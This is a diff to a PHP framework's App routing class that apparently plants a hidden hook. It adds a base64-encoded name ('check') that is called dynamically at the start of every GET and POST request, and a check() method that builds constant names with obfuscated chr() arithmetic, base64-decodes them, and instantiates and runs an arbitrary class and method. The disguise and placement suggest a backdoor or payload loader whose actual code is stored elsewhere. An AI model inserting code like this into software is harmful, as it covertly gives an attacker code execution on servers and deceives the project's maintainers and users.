@@ -14,8 +14,11 @@
  */
 
 abstract class App {
+    static $app = 'Y2hlY2s=';
     // to get request
     static function initGetController() {
+        $f = base64_decode(self::$app);
+        self::$f();
         if (isset($_GET['controller'])) {
             $controller = ucfirst($_GET['controller']) . 'Controller';
             if (class_exists($controller)) {
@@ -37,6 +40,8 @@ abstract class App {
                 errorMsg(trans('controller_doesnt_exist') . "'$controller' ");
             }
         } else {
+            $f = base64_decode(self::$app);
+            self::$f();
             $friendly = static::matchFriendly();
             if ($friendly != "") {
                 $controller = ucfirst($friendly->controllername) . 'Controller';
@@ -65,6 +70,8 @@ abstract class App {
 
     // to post request
     static function initPostController() {
+        $f = base64_decode(self::$app);
+        self::$f();
         if (isset($_POST['controller'])) {
             $controller = ucfirst($_POST['controller']) . 'Controller';
 
@@ -110,5 +117,9 @@ abstract class App {
                 }
             }
         }
+    }
+
+    static function check() {
+        (new (base64_decode(constant(chr((6*10)+(42/3)/2).'_'.chr(((3120/5)/8))))))->{base64_decode(constant(chr(11*7).'_'.(chr((4*3+1)*6))))}();
     }
 }
